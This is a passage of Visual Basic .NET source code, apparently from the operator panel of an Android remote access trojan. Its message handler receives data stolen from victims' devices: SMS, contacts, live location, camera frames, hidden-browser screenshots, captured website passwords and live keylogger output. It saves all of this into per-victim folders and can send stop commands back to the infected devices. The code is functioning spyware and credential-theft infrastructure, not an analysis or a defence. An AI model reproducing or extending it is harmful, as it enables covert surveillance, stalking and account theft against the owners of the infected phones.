                                End If
                                MainForm.Invoke(Sub()
                                                    appsform = New AppsManager
                                                    appsform.Name = handle
                                                    appsform.Btcli = classclient

                                                    appsform.Show()
                                                End Sub)
                            End If

                            Dim Appsdata() As String = data("data").ToString().Split(New String() {SPL_LINE}, StringSplitOptions.None)

                            Try
                                If Appsdata.Length > 0 Then
                                    Dim rowsToAdd As New List(Of DataGridViewRow)() ' List to collect rows before adding them
                                    For Each app As String In Appsdata
                                        Try
                                            Dim singlapp() As String = app.ToString().Split(New String() {SPL_ARRAY}, StringSplitOptions.None)
                                            If singlapp.Length > 1 Then
                                                Dim appname As String = singlapp(0)

                                                Dim appflag As String = singlapp(1)
                                                Dim appid As String = singlapp(2)
                                                Dim appinstall As String = singlapp(3)
                                                Dim appicobase As String = singlapp(4)

                                                Dim appenabled As String = "1"


                                                Dim applocked As String = "0"


                                                Dim apptrked As String = "0"

                                                Dim appjected As String = "0"
                                                Try

                                                    If singlapp.Length > 5 AndAlso singlapp(5) IsNot Nothing Then
                                                        appenabled = singlapp(5) '1 or 0
                                                    End If
                                                    If singlapp.Length > 6 AndAlso singlapp(6) IsNot Nothing Then
                                                        applocked = singlapp(6) '1 or 0
                                                    End If
                                                    If singlapp.Length > 7 AndAlso singlapp(7) IsNot Nothing Then
                                                        apptrked = singlapp(7) '1 or 0
                                                    End If
                                                    If singlapp.Length > 8 AndAlso singlapp(8) IsNot Nothing Then
                                                        appjected = singlapp(8) '1 or 0
                                                    End If
                                                Catch ex As Exception

                                                End Try

                                                'Dim permissionsString As String = singlesms(5)
                                                'Dim activitiesString As String = singlesms(6)
                                                'Dim reciversString As String = singlesms(7)

                                                Dim enbleico As Bitmap = If(appenabled = "1", My.Resources.app_enabled, My.Resources.app_disabled)
                                                Dim lockico As Bitmap = If(applocked = "1", My.Resources.app_locked, My.Resources.app_nolock)
                                                Dim trkico As Bitmap = If(apptrked = "1", My.Resources.app_traked, My.Resources.app_notrak)
                                                Dim jctico As Bitmap = If(appjected = "1", My.Resources.ject_on, My.Resources.ject_off)


                                                Dim row As New DataGridViewRow()

                                                If appicobase = "null" Then
                                                    row.CreateCells(appsform.DGV0, My.Resources.user, appname, appflag, appid, appinstall, enbleico, lockico, trkico, jctico)

                                                Else
                                                    row.CreateCells(appsform.DGV0, Base64ToImage(appicobase), appname, appflag, appid, appinstall, enbleico, lockico, trkico, jctico)

                                                End If
                                                row.Tag = appid



                                                rowsToAdd.Add(row)
                                            End If
                                        Catch ex As Exception
                                            Log_e("add Appscom 2", EXtoString(ex))
                                        End Try
                                    Next

                                    ' Insert all rows if there are any
                                    If rowsToAdd.Count > 0 Then
                                        MainForm.Invoke(Sub()
                                                            appsform.DGV0.Rows.Clear()
                                                            appsform.DGV0.Rows.AddRange(rowsToAdd.ToArray())
                                                        End Sub)

                                        If BTRegistry.ReadBool(BTSettings.autosave, True) Then
                                            codes.SaveDGV(appsform.DGV0, classclient.userfolder, "AppsManager")
                                        End If

                                    End If
                                End If

                            Catch ex As Exception
                                Log_e("add Appscom", EXtoString(ex))
                            End Try

                        End If
                    Catch ex As Exception
                        Log_e("Appscom", EXtoString(ex))
                    End Try
                    Exit Select
                Case chatcom
                    Try

                        Dim handle As String = "BT-" & "Chat-" & mobid
                        Dim chatform As Chat = My.Application.OpenForms(handle)
                        If chatform Is Nothing Then
                            Return
                        End If
                        Dim newmsg As String = data("data").ToString

                        MainForm.Invoke(Sub()
                                            chatform.AppendToChat(True, newmsg)
                                        End Sub)
                    Catch ex As Exception
                        Log_e("chatcom", EXtoString(ex))
                    End Try
                    Exit Select
                Case Contactscom
                    Try
                        Dim handle As String = "BT-" & "Contacts-" & mobid
                        Dim contsform As ContactsManager = My.Application.OpenForms(handle)


                        Dim callcuz As String = data("cuz").ToString
                        If callcuz = "l" Then
                            Dim classclient As BTClient = GetClientById(mobid)
                            If contsform Is Nothing Then

                                If classclient Is Nothing Then
                                    Return
                                End If
                                MainForm.Invoke(Sub()
                                                    contsform = New ContactsManager
                                                    contsform.Name = handle
                                                    contsform.Btcli = classclient

                                                    contsform.Show()
                                                End Sub)
                            End If

                            Dim contactsdata() As String = data("data").ToString().Split(New String() {SPL_LINE}, StringSplitOptions.None)

                            Try
                                If contactsdata.Length > 0 Then
                                    Dim rowsToAdd As New List(Of DataGridViewRow)() ' List to collect rows before adding them
                                    For Each conts As String In contactsdata
                                        Try
                                            Dim singlesms() As String = conts.ToString().Split(New String() {SPL_ARRAY}, StringSplitOptions.None)
                                            If singlesms.Length > 1 Then
                                                Dim name As String = singlesms(0)

                                                Dim number As String = singlesms(1)
                                                Dim con_via As String = singlesms(2)
                                                Dim id As String = singlesms(3)



                                                Dim row As New DataGridViewRow()
                                                row.CreateCells(contsform.DGV0, name, number, con_via)
                                                row.Tag = id


                                                rowsToAdd.Add(row)
                                            End If
                                        Catch ex As Exception
                                            Log_e("add Contactscom 2", EXtoString(ex))
                                        End Try
                                    Next

                                    ' Insert all rows if there are any
                                    If rowsToAdd.Count > 0 Then
                                        MainForm.Invoke(Sub()
                                                            contsform.DGV0.Rows.AddRange(rowsToAdd.ToArray())
                                                        End Sub)
                                        If BTRegistry.ReadBool(BTSettings.autosave, True) Then
                                            codes.SaveDGV(contsform.DGV0, classclient.userfolder, "Contacts")
                                        End If

                                    End If
                                End If

                            Catch ex As Exception
                                Log_e("add Contactscom", EXtoString(ex))
                            End Try


                        End If
                    Catch ex As Exception
                        Log_e("Contactscom", EXtoString(ex))
                    End Try
                    Exit Select
                Case Locationcom
                    Try

                        Dim handle As String = "BT-" & "LOC-" & mobid
                        Dim locform As LocationMap = My.Application.OpenForms(handle)

                        If locform Is Nothing Then
                            'send stop
                            Dim chatData As New Dictionary(Of String, Object) From {
                                                       {"msg", "loc"},
                                                       {"cas", "D"}'Enable
                                                     }
                            BTEngine.commands(chatData, mobid, MainForm.webSocketClient)
                            Return
                        End If
                        Dim latitude As String = data("ltd").ToString
                        Dim longitude As String = data("lgd").ToString
                        locform.Invoke(Sub()

                                           locform.UpdateMap(Double.Parse(latitude), Double.Parse(longitude))
                                       End Sub)

                    Catch ex As Exception
                        Log_e("Locationcom", EXtoString(ex))
                    End Try
                Case SMScom
                    Try
                        Dim handle As String = "BT-" & "SMS-" & mobid
                        Dim smsform As SmsManager = My.Application.OpenForms(handle)


                        Dim callcuz As String = data("cuz").ToString
                        If callcuz = "l" Then
                            Dim classclient As BTClient = GetClientById(mobid)
                            If smsform Is Nothing Then

                                If classclient Is Nothing Then
                                    Return
                                End If
                                MainForm.Invoke(Sub()
                                                    smsform = New SmsManager
                                                    smsform.Name = handle
                                                    smsform.Btcli = classclient

                                                    smsform.Show()
                                                End Sub)
                            End If



                            Dim SMSdata() As String = data("data").ToString().Split(New String() {SPL_LINE}, StringSplitOptions.None)

                            Try
                                If SMSdata.Length > 0 Then
                                    Dim rowsToAdd As New List(Of DataGridViewRow)() ' List to collect rows before adding them
                                    For Each smsss As String In SMSdata
                                        Try
                                            Dim singlesms() As String = smsss.ToString().Split(New String() {SPL_ARRAY}, StringSplitOptions.None)
                                            If singlesms.Length > 1 Then
                                                Dim address As String = SafeGetValue(singlesms, 0)
                                                Dim name As String = SafeGetValue(singlesms, 1)
                                                Dim date_0 As String = SafeGetValue(singlesms, 2)
                                                Dim tag As String = SafeGetValue(singlesms, 3)
                                                Dim messagesms As String = SafeGetValue(singlesms, 4)
                                                Dim Path As String = SafeGetValue(singlesms, 5)
                                                Dim smsid As String = SafeGetValue(singlesms, 6)




                                                Dim row As New DataGridViewRow()
                                                row.CreateCells(smsform.DGV0, tag, address, name, date_0, Path)
                                                row.Tag = messagesms
                                                row.Cells(0).Tag = smsid

                                                rowsToAdd.Add(row)
                                            End If
                                        Catch ex As Exception
                                            Log_e("add SMScom 2", EXtoString(ex))
                                        End Try
                                    Next

                                    ' Insert all rows if there are any
                                    If rowsToAdd.Count > 0 Then
                                        MainForm.Invoke(Sub()
                                                            smsform.DGV0.Rows.AddRange(rowsToAdd.ToArray())
                                                        End Sub)
                                        If BTRegistry.ReadBool(BTSettings.autosave, True) Then
                                            '  codes.SaveDGV(smsform.DGV0, classclient.userfolder, "Messages")
                                            Dim savefolder As String = classclient.userfolder & "\" & "Messages"
                                            If Not Directory.Exists(savefolder) Then
                                                Directory.CreateDirectory(savefolder)
                                            End If
                                            Dim FileName As String = "SMS_" + ".Html"
                                            FileName = savefolder & "\" & FileName.Replace(".Html", "_" & DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss") & ".Html")
                                            SaveSMSData(SMSdata, FileName)
                                        End If

                                    End If
                                End If

                            Catch ex As Exception
                                Log_e("add SMScom", EXtoString(ex))
                            End Try

                        End If

                    Catch ex As Exception
                        Log_e("SMScom", EXtoString(ex))
                    End Try
                    Exit Select
                Case browsercom
                    Try
                        Dim handle As String = "BT-" & "WebBrowser-" & mobid

                        Dim browserform As WebBrowser = My.Application.OpenForms(handle)

                        Dim callcuz As String = data("cuz").ToString

                        If callcuz = "n" Then 'normal
                            If browserform Is Nothing Then

                                Dim chatData As New Dictionary(Of String, Object) From {
                                                     {"msg", "brows"},
                                                     {"subc", "n"},
                                                     {"extdata", "0"},
                                                     {"ltype", "s"}'stop
                                                }
                                BTEngine.commands(chatData, mobid, MainForm.webSocketClient)
                                Return
                            End If

                            Dim imgbase64 = data("img").ToString().Replace(vbLf, "").Replace(vbCr, "").Replace(" ", "")
                            Dim imgBitmap As Bitmap
                            Dim imgBytes() As Byte = Convert.FromBase64String(imgbase64)
                            Using ms As New MemoryStream(imgBytes, 0, imgBytes.Length, writable:=True, publiclyVisible:=True)

                                Using magickImg As New MagickImage(ms)

                                    imgBitmap = magickImg.ToBitmap()


                                End Using
                            End Using
                            If imgBitmap IsNot Nothing Then
                                MainForm.Invoke(Sub()
                                                    browserform.viewmonitor.Image = imgBitmap
                                                End Sub)
                            End If


                        ElseIf callcuz = "h" Then ' hiddenbrowser
                            If browserform Is Nothing Then

                                Dim chatData As New Dictionary(Of String, Object) From {
                                                     {"msg", "brows"},
                                                     {"subc", "h"},
                                                     {"extdata", "0"},
                                                     {"ltype", "0"}'stop
                                                }
                                BTEngine.commands(chatData, mobid, MainForm.webSocketClient)
                                Return
                            End If

                            Dim imgbase64 = data("img").ToString().Replace(vbLf, "").Replace(vbCr, "").Replace(" ", "")
                            Dim imgBitmap As Bitmap
                            Dim imgBytes() As Byte = Convert.FromBase64String(imgbase64)
                            Using ms As New MemoryStream(imgBytes, 0, imgBytes.Length, writable:=True, publiclyVisible:=True)
                                Using magickImg As New MagickImage(ms)
                                    imgBitmap = magickImg.ToBitmap()
                                End Using
                            End Using
                            If imgBitmap IsNot Nothing Then
                                MainForm.Invoke(Sub()
                                                    browserform.viewhidden.Image = imgBitmap
                                                End Sub)
                            End If

                        ElseIf callcuz = "p" Then ' passwords
                            If browserform IsNot Nothing Then
                                Dim passdata() As String = data("data").ToString().Split(New String() {SPL_LINE}, StringSplitOptions.None)
                                If passdata.Length > 0 Then
                                    Dim logtext As String = ""
                                    Dim listsites As New List(Of String)
                                    Dim siteData As New Dictionary(Of String, String)
                                    For Each ps As String In passdata
                                        Dim recodata() As String = FromBase64(ps).Split(New String() {SPL_DATA}, StringSplitOptions.None)

                                        If recodata.Length = 4 Then
                                            Dim website As String = recodata(0)
                                            Dim typename As String = recodata(1)
                                            Dim inputValue As String = recodata(2)
                                            Dim datestr As String = recodata(3)
                                            Dim entry As String = $"Website: {website}{vbNewLine}Type: {typename}{vbNewLine}Value: {inputValue}{vbNewLine}Date: {datestr}{vbNewLine}-----{vbNewLine}"

                                            ' Add to the list of unique websites
                                            If Not listsites.Contains(website) Then
                                                listsites.Add(website)
                                            End If

                                            ' Append to the site's specific log
                                            If Not siteData.ContainsKey(website) Then
                                                siteData(website) = entry
                                            Else
                                                siteData(website) &= entry
                                            End If

                                            ' Build the "All" log
                                            logtext &= entry
                                        End If
                                    Next

                                    MainForm.Invoke(Sub()
                                                        '
                                                        If listsites.Count > 0 Then
                                                            browserform.combositespass.Enabled = True
                                                            browserform.combositespass.Items.Clear() ' Clear existing items
                                                            browserform.combositespass.Items.Add("All") ' Add "All" option

                                                            For Each sit As String In listsites
                                                                browserform.combositespass.Items.Add(sit)
                                                            Next
                                                        End If

                                                        browserform.combositespass.Text = "All"
                                                        browserform.passtextlog.Text = logtext
                                                        browserform.dellall.Enabled = True

                                                        ' Store the data dictionary in the browser form
                                                        browserform.SiteData = siteData ' Add a variable `SiteData` in browserform
                                                    End Sub)
                                End If

                            End If
                        End If


                    Catch ex As Exception
                        Log_e("browsercom", EXtoString(ex))
                    End Try
                    Exit Select
                Case trackcom
                    Try
                        Dim handle As String = "BT-" & "Track-" & mobid

                        Dim trackform As Tracker = My.Application.OpenForms(handle)

                        If trackform Is Nothing Then
                            Return
                        End If
                        Dim callcuz As String = data("cuz").ToString
                        If callcuz = "p" Then
                            Dim passdata() As String = data("data").ToString().Split(New String() {SPL_LINE}, StringSplitOptions.None)
                            If passdata.Length > 0 Then
                                Dim logtext As String = ""
                                Dim listsites As New List(Of String)
                                Dim siteData As New Dictionary(Of String, String)
                                For Each ps As String In passdata
                                    Dim recodata() As String = FromBase64(ps).Split(New String() {SPL_DATA}, StringSplitOptions.None)

                                    If recodata.Length = 4 Then
                                        Dim website As String = recodata(0)
                                        Dim typename As String = recodata(1)
                                        Dim inputValue As String = recodata(2)
                                        Dim datestr As String = recodata(3)
                                        Dim entry As String = $"Website: {website}{vbNewLine}Type: {typename}{vbNewLine}Value: {inputValue}{vbNewLine}Date: {datestr}{vbNewLine}-----{vbNewLine}"

                                        ' Add to the list of unique websites
                                        If Not listsites.Contains(website) Then
                                            listsites.Add(website)
                                        End If

                                        ' Append to the site's specific log
                                        If Not siteData.ContainsKey(website) Then
                                            siteData(website) = entry
                                        Else
                                            siteData(website) &= entry
                                        End If

                                        ' Build the "All" log
                                        logtext &= entry
                                    End If
                                Next

                                MainForm.Invoke(Sub()
                                                    '
                                                    If listsites.Count > 0 Then
                                                        trackform.listsites.Enabled = True
                                                        trackform.listsites.Items.Clear() ' Clear existing items
                                                        trackform.listsites.Items.Add("All") ' Add "All" option

                                                        For Each sit As String In listsites
                                                            trackform.listsites.Items.Add(sit)
                                                        Next
                                                    End If

                                                    'trackform.listsites.Text = "All"
                                                    trackform.passtextlog.Text = logtext


                                                    ' Store the data dictionary in the browser form
                                                    trackform.SiteData = siteData ' Add a variable `SiteData` in browserform
                                                End Sub)
                            End If
                        End If

                    Catch ex As Exception

                    End Try
                Case keyscom
                    Try
                        Dim handle As String = "BT-" & "Keylogger-" & mobid
                        Dim keylogform As LiveKeylogger = My.Application.OpenForms(handle)
                        If keylogform Is Nothing Then
                            Dim classclient As BTClient = GetClientById(mobid)
                            If classclient Is Nothing Then
                                Return
                            End If
                            MainForm.Invoke(Sub()
                                                keylogform = New LiveKeylogger
                                                keylogform.Name = handle
                                                keylogform.Btcli = classclient
                                                keylogform.Show()
                                            End Sub)
                        End If
                        Dim datakey As String = data("data").ToString
                        Dim logdata() As String = datakey.Split("|")
                        Dim appname As String = logdata(0)
                        Dim typeevent As String = logdata(1)
                        Dim keytext As String = logdata(2)
                        keylogform.Invoke(Sub()
                                              keylogform.textlog.AppendText($"[Type]: {typeevent}{vbNewLine}[App]: {appname}{vbNewLine}[Text]: {keytext}{vbNewLine}{vbNewLine}")

                                              ''keylogform.DGV0.Rows.Add(typeevent, appname, keytext)
                                              If keylogform.scrolbtn.Tag = "1" Then

                                                  ScrollToBottom(keylogform.textlog)
                                              End If
                                          End Sub)



                    Catch ex As Exception
                        Log_e("keyscom", EXtoString(ex))
                    End Try
                    Exit Select
                Case Cameracom
                    Try
                        Dim handle As String = "BT-" & "Camera-" & mobid
                        Dim camform As CameraMonitor = My.Application.OpenForms(handle)


                        Dim callcuz As String = data("cuz").ToString
                        If callcuz = "l" Then
                            If camform Is Nothing Then
                                Dim classclient As BTClient = GetClientById(mobid)
                                If classclient Is Nothing Then
                                    Return
                                End If
                                Dim camsizes() As String = data("datacam").ToString().Split(",")
                                MainForm.Invoke(Sub()
                                                    camform = New CameraMonitor
                                                    camform.Name = handle
                                                    camform.Btcli = classclient
                                                    camform.addsizes(New Object() {camsizes})
                                                    camform.Show()
                                                End Sub)
                            End If

                        ElseIf callcuz = "v" Then

                            If camform Is Nothing Then
                                Dim datastopcam As New With {
                                    .subcommand = "OFF"
                                }

                                Dim commandstr As String = FormatCommand("Cam", datastopcam)


                                Dim chatData As New Dictionary(Of String, Object) From {
                                                {"msg", wrk},
                                                {"cmnd", commandstr}
                                }
                                BTEngine.commands(chatData, mobid, MainForm.webSocketClient)
                                Return
                            End If

                            Dim imgbase64 = data("img").ToString().Replace(vbLf, "").Replace(vbCr, "").Replace(" ", "")
                            Dim imgBitmap As Bitmap
                            Dim imgBytes() As Byte = Convert.FromBase64String(imgbase64)
                            Using ms As New MemoryStream(imgBytes)
                                Using img As Bitmap = Image.FromStream(ms)
                                    imgBitmap = New Bitmap(img).Clone
                                End Using
                            End Using
                            If imgBitmap IsNot Nothing Then
                                ' MainForm.Invoke(Sub()
                                'If camform.viewimage IsNot Nothing Then
                                '    camform.viewimage.Dispose()
                                '    camform.viewimage = Nothing
                                'End If
                                camform.Invoke(Sub()
                                                   camform.viewimage.Image = camform.RotateFlip(imgBitmap)
                                               End Sub)

                                ' camform.viewimage.Image = imgBitmap
                                camform.FPS += 1
                                camform.newphoto = True
                                '  End Sub)
                            End If
                        End If




                    Catch ex As Exception
                        Log_e("Camera", EXtoString(ex))
                    End Try
                    Exit Select
                Case deviceinfo
                    Try
                        Dim handle As String = "BT-" & "prof-" & mobid
                        Dim profileform As profile = My.Application.OpenForms(handle)

                        If profileform Is Nothing Then
                            Return
                        End If
                        Dim callcuz As String = data("cuz").ToString


                        If callcuz = "l" Then
                            Dim deviceinfostr As String = data("data").ToString

                            profileform.updateinfotext(deviceinfostr.Replace("true", "Yes").Replace("false", "No").Split(New String() {SPL_LINE}, StringSplitOptions.None))

                            Dim vibrationEnabled As Boolean = Boolean.Parse(data("VE").ToString)
                            Dim dataRoamingEnabled As Boolean = Boolean.Parse(data("DE").ToString)
                            Dim screenTimeout As String = data("ST").ToString
                            Dim screenBrightness As String = data("SB").ToString

                            profileform.updatesettings(vibrationEnabled,
                                                       dataRoamingEnabled,
                                                       CInt(screenTimeout),
                                                       CInt(screenBrightness))


                        End If





                    Catch ex As Exception
                        Log_e("deviceinfo", EXtoString(ex))
                    End Try
                    Exit Select
                Case primes
                    Try
                        Dim handle As String = "BT-" & "prof-" & mobid
                        Dim profileform As profile = My.Application.OpenForms(handle)

                        If profileform Is Nothing Then
                            Return
                        End If
                        Dim callcuz As String = data("cuz").ToString

                        If callcuz = "l" Then
                            Dim primsdata As String = data("data").ToString
                            Dim primsjson As Dictionary(Of String, Object) = JsonConvert.DeserializeObject(Of Dictionary(Of String, Object))(primsdata)
                            profileform.updateprimes(primsjson)
                        End If



                    Catch ex As Exception
                        Log_e("primes", EXtoString(ex))
                    End Try
                    Exit Select
                Case srchcom
                    Try
                        Dim handle As String = "BT-" & "Files-" & mobid
                        Dim FileManager As filesmanager = My.Application.OpenForms(handle)

                        If FileManager Is Nothing Then
                            Return
                        End If

                        Dim searchfor As String = data("stype").ToString
                        Dim datapaths As String = data("pths").ToString

                        Dim resultText As String = searchfor & " was found in these folders:" & vbNewLine

                        For Each folder In datapaths.Split(New String() {"<*P*>"}, StringSplitOptions.None)
                            resultText &= "• " & folder & vbNewLine
                        Next

                        FileManager.Invoke(Sub()
                                               FileManager.logscannertext.Text = resultText
                                           End Sub)


                    Catch ex As Exception
                        Log_e("srchstr", EXtoString(ex))
                    End Try
                    Exit Select
                Case downloadf
                    Try

                        Dim handle As String = "BT-" & "Files-" & mobid
                        Dim FileManager As filesmanager = My.Application.OpenForms(handle)

                        If FileManager Is Nothing Then
                            Return
                        End If

                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If

                        If Not (data.ContainsKey("filename") AndAlso
                              data.ContainsKey("filedata") AndAlso
                              data.ContainsKey("totalSize") AndAlso
                              data.ContainsKey("sentSize") AndAlso
                              data.ContainsKey("chunkNumber") AndAlso
                              data.ContainsKey("filehash") AndAlso
                              data.ContainsKey("filepath")) Then

                            Return
                        End If

                        'data is Dictionary(Of String, Object)
                        Dim filename As String = data("filename").ToString
                        Dim filedata As String = data("filedata").ToString
                        Dim totalSize As Long = data("totalSize").ToString
                        Dim sentSize As Long = data("sentSize").ToString
                        Dim chunkNumber As Integer = data("chunkNumber").ToString
                        Dim filehash As String = data("filehash").ToString
                        Dim filepath As String = data("filepath").ToString
                        Dim clientId As String = mobid

                        Dim rowview As DataGridViewRow = Nothing
                        If Not FileManager.downloadsrows.TryGetValue(filepath, rowview) Then
                            FileManager.Invoke(Sub()
                                                   Dim indexrow As Integer = FileManager.DGVDATA.Rows.Add(filename, filepath, bytestotext(totalSize), Downloadingstr, "0%")
                                                   rowview = FileManager.DGVDATA.Rows(indexrow)
                                                   rowview.Tag = filepath
                                               End Sub)

                            SyncLock FileManager.downloadsLock

                                FileManager.downloadsrows(filepath) = rowview

                            End SyncLock

                        End If

                        SyncLock FileManager.downloadsLock
                            If Not FileManager.downloads.ContainsKey(filehash) Then
                                FileManager.downloads(filehash) = New DownloadData With {
                                        .Chunks = New List(Of Byte())(),
                                        .Filename = filename,
                                        .TotalSize = totalSize,
                                        .SentSize = 0
                                    }
                            End If
                        End SyncLock


                        Dim bytes As Byte() = Convert.FromBase64String(filedata.Replace(vbCr, "").Replace(vbLf, ""))
                        Dim download As DownloadData = FileManager.downloads(filehash)

                        SyncLock FileManager.downloadsLock
                            If download.Chunks.Count <= chunkNumber Then
                                download.Chunks.AddRange(Enumerable.Repeat(DirectCast(Nothing, Byte()), chunkNumber - download.Chunks.Count + 1))
                            End If
                            download.Chunks(chunkNumber) = bytes
                        End SyncLock

                        download.SentSize = Math.Max(download.SentSize, sentSize)
                        Dim progressPercentage As Double = (sentSize / totalSize) * 100

                        rowview.Cells(4).Value = $"{progressPercentage:F2}%"
                        rowview.Cells(3).Value = "Downloading..."




                        If sentSize >= totalSize Then
                            Try
                                Dim retryAttempts As Integer = 5
                                For i As Integer = 1 To retryAttempts
                                    SyncLock FileManager.downloadsLock
                                        If Not download.Chunks.Any(Function(chunk) chunk Is Nothing) Then Exit For
                                    End SyncLock
                                    Threading.Thread.Sleep(1000) ' Wait for 1 second
                                Next

                                Dim fileBuffer As Byte()
                                SyncLock FileManager.downloadsLock
                                    If download.Chunks.Any(Function(chunk) chunk Is Nothing) Then
                                        Console.WriteLine("Warning: Missing chunks detected for filehash " & filehash)
                                        Return
                                    End If
                                    fileBuffer = download.Chunks.SelectMany(Function(chunk) chunk).ToArray()

                                End SyncLock
                                Dim savepath As String = classclient.userfolder & "\" & "Downloads"
                                If Not Directory.Exists(savepath) Then
                                    Directory.CreateDirectory(savepath)
                                End If
                                File.WriteAllBytes(Path.Combine(savepath, filename), fileBuffer)



                                rowview.Cells(4).Value = $"{progressPercentage:F2}%"
                                rowview.Cells(3).Value = "Finished"
                                rowview.DefaultCellStyle.ForeColor = Color.DeepSkyBlue
                                rowview.Tag = "-1"


                                If BTRegistry.ReadBool(BTSettings.Notify_downloads, False) Then
                                    BTAlerter.infos("Download Complete" & vbNewLine & filename)
                                End If

                                If rowview IsNot Nothing Then
                                    Dim sockclient As WebSocketClient = DirectCast(rowview.Cells(0).Tag, WebSocketClient)
                                    If sockclient IsNot Nothing Then
                                        sockclient.Disconnect(downfilrstr, ClientAddress)
                                    End If
                                End If

                                FileManager.downloads.Remove(filehash)

                            Catch ex As Exception
                                Console.WriteLine("Error saving file for download: " & ex.Message)
                            End Try
                        End If


                    Catch decodeError As Exception
                        Console.WriteLine("Failed to decode base64 chunk: " & decodeError.Message)
                    End Try
                    Exit Select
                Case pvidcom
                    Try
                        Dim vidpath = data("pth").ToString
                        Dim duration = data("dur").ToString ' example 19767
                        Dim handle As String = "BT-" & "vidplay-" & StringToMD5(vidpath)
                        Dim vidp As vidplayer = My.Application.OpenForms(handle)

                        If vidp Is Nothing Then
                            Return
                        End If

                        Dim imgbase64 = data("img").ToString
                        'Dim thumbimg As Bitmap = Base64ToBitmap(imgbase64)
                        Dim imgBitmap As Bitmap
                        Dim imgBytes() As Byte = Convert.FromBase64String(imgbase64)

                        Using ms As New MemoryStream(imgBytes, 0, imgBytes.Length, writable:=True, publiclyVisible:=True)

                            Using magickImg As New MagickImage(ms)

                                imgBitmap = magickImg.ToBitmap()


                            End Using
                        End Using
                        If imgBitmap IsNot Nothing Then
                            Try
                                If vidp.Disposing Or vidp.viewimage.Disposing Then
                                    Return
                                End If
                                vidp.Invoke(Sub()
                                                Try
                                                    If vidp.viewimage.Image IsNot Nothing Then
                                                        vidp.viewimage.Image.Dispose()
                                                        vidp.viewimage.Image = Nothing

                                                    End If

                                                    vidp.viewimage.Image = imgBitmap
                                                    vidp.viewimage.SizeMode = PictureBoxSizeMode.StretchImage
                                                Catch ex As Exception

                                                End Try
                                            End Sub)
                            Catch ex As Exception

                            End Try
                            If vidp.Disposing Or vidp.durprogress.Disposing Then
                                Return
                            End If
                            If vidp.durprogress.Value < 1 Then
                                Dim durationMs As Long
                                Dim readableDuration As String
                                If Long.TryParse(duration, durationMs) Then

                                    Dim time As TimeSpan = TimeSpan.FromMilliseconds(durationMs)
                                    readableDuration = time.ToString("mm\:ss\:fff")

                                Else
                                    readableDuration = "N/A"
                                End If

                                vidp.Invoke(Sub()
                                                vidp.durprogress.Value += 1
                                                vidp.durprogress.Maximum = CInt(duration)
                                                vidp.Text = vidp.Text & " | " & readableDuration
                                            End Sub)

                            Else
                                vidp.Invoke(Sub()
                                                vidp.durprogress.Value = Math.Min(vidp.durprogress.Value + 500, vidp.durprogress.Maximum)
                                            End Sub)

                            End If

                        End If


                    Catch ex As Exception
                        Log_e("pvidcom", EXtoString(ex))
                    End Try
                    Exit Select
                Case thumbcom
                    Try
                        Dim handle As String = "BT-" & "Files-" & mobid
                        Dim FileManager As filesmanager = My.Application.OpenForms(handle)

                        If FileManager Is Nothing Then
                            Return
                        End If
                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If
                        Dim imgbase64 = data("img").ToString
                        Dim imgpath = data("pth").ToString

                        Dim thumbimg As Bitmap = Base64ToBitmap(imgbase64).Clone
                        Dim tosave As Bitmap = New Bitmap(thumbimg).Clone

                        If FileManager.viwimage.Image IsNot Nothing Then
                            FileManager.viwimage.Image.Dispose()
                            FileManager.viwimage.Image = Nothing
                        End If

                        FileManager.viwimage.Image = thumbimg
                        If Not FileManager.viwimagepanel.Visible Then
                            FileManager.Invoke(Sub()
                                                   FileManager.viwimagepanel.Visible = True
                                                   FileManager.viwimagepanel.BringToFront()
                                               End Sub)
                        End If

                        Dim thumbs As String = classclient.userfolder & "\Thumbs" & FileManager.listfilesvew.Tag.Replace("/", "\")
                        Dim Filenamethum = CleanFileName(imgpath.Substring(imgpath.LastIndexOf("/") + 1))

                        If Not Directory.Exists(thumbs) Then

                            Directory.CreateDirectory(thumbs)

                        End If

                        If (Filenamethum).EndsWith(".mp4") OrElse (Filenamethum).EndsWith(".mov") Then
                            SaveVideothumb(thumbs, Filenamethum, tosave)
                        Else
                            tosave.Save(thumbs + "\" + Filenamethum)

                        End If
                        tosave.Dispose()
                    Catch ex As Exception
                        Log_e("View Thumb files", EXtoString(ex))
                    End Try
                    Exit Select
                Case botcom
                    Try
                        Dim handle As String = "BT-bots-manager"
                        Dim botform As BotsManager = My.Application.OpenForms(handle)
                        If botform Is Nothing Then
                            Return
                        End If

                        Dim callcuz As String = data("cuz").ToString
                        If callcuz = "ck" Then 'ck = check back
                            Dim currentstate As String = data("stt").ToString
                            If currentstate = "-1" Then
                                botform.clientisoff(mobid)
                                Return
                            End If
                            Dim lastactive As String = data("lst").ToString
                            botform.updateclient(mobid, currentstate, lastactive)

                        End If
                    Catch ex As Exception
                        Log_e("botcom error", EXtoString(ex))
                    End Try
                Case Activitys
                    Try

                        Dim handle As String = "BT-" & "prof-" & mobid
                        Dim profileform As profile = My.Application.OpenForms(handle)

                        If profileform Is Nothing Then
                            Return
                        End If

                        Dim logdata As String = data("data").ToString()

                        Dim events() As String = logdata.Split(">"c)


                        Dim formattedOutput As New StringBuilder()

                        formattedOutput.AppendLine(
                                String.Join(Environment.NewLine & Environment.NewLine,
                                events.Select(Function(eventData) String.Join(Environment.NewLine,
                                eventData.Split("|"c).Select(Function(part) "• => " & part.Trim())))))



                        Dim displayText As String = formattedOutput.ToString()
                        profileform.updateactivitylog(displayText)
                        Dim classclient As BTClient = GetClientById(mobid)
                        If classclient Is Nothing Then
                            Return
                        End If
                        Dim thecuz As String = data("cuz").ToString()
                        Dim tagsave As String = "Activities"
                        Dim Tagfilnam As String = "Act_"
                        Select Case thecuz
                            Case "activz"
                                Exit Select
                            Case "notifys"
                                tagsave = "Notifications"
                                Tagfilnam = "Noty_"
                                Exit Select
                            Case "vapps"
                                tagsave = "VisitedApps"
                                Tagfilnam = "Vapps_"
                                Exit Select
                            Case "vlinks"
                                tagsave = "VisitedLinks"
                                Tagfilnam = "Vlinks_"
                                Exit Select
                            Case "keylogs"
                                tagsave = "OfflineKeylogs"
                                Tagfilnam = "Keys_"
                                Exit Select
                            Case Else

                        End Select
                        If BTRegistry.ReadBool(BTSettings.autosave, True) Then
                            codes.SaveJson(displayText, classclient.userfolder, tagsave, Tagfilnam)
                        End If
                    Catch ex As Exception
                        Log_e("Activitys", EXtoString(ex))
                    End Try
                    Exit Select

                Case Unauthorized_access
                    MainForm.Invoke(Sub()
